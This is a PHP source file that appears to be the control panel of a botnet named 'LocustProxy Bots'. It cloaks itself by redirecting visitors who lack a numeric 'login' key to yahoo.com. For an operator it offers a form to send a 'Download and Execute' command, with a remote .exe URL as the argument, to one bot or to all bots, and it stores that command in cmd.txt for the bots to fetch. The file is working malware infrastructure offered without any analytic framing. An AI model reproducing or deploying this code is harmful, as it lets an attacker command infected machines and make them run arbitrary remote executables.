<?php
if(!isset($_GET['login']))
{
	header("Location: http://yahoo.com");
	exit();
}
elseif($_GET['login'] % 10 > 0)
{
	header("Location: http://yahoo.com");
	exit();
}
Error_Reporting(E_ALL & ~E_NOTICE);
	 $cmd = "cmd.txt";
	 $gcmd			=		$_GET['getcmd']; 
		echo '<br><br><b>[ Send a command to LocustProxy Bots: ]</b><br><br>'; 
		echo '<form action="" method="post">'; 
		echo 'Enter a name of a bot (a symbol "*" - to all bots at once)<br>';
		echo '<input name="botuid" size="10" value="*"><br>'; 
	#	echo '<input name="newcmd" size="40" value="dexec_http://localhost/1.exe"><br>'; 
	#	echo '<input name="set" value="establish" type="submit"><br><br>'; 
 
		echo 'Choose a command for installation<br>';
        echo '<SELECT name=newcmd>'; 
        echo '<OPTION value=dexec>Download and Execute</OPTION>'; 
        echo '<OPTION value=nocommand>Clean a command</OPTION>'; 
		echo '</SELECT><br>';
		
        echo 'Argument: <input name="arg1" size="50" value="http://uncanny.google.com/as.exe"><br>';
		
		echo '<input name="set" value="send_command" type="submit"><br><br>'; 
		echo '</form>';
		
		$newcmd = htmlspecialchars(addslashes($_POST['newcmd']."".$_POST['arg1'])); 

                unlink($cmd);
                $fp2 = fopen( "$cmd", "a" );
                fputs( $fp2, "".$newcmd );

                fclose( $fp2 );
 ?>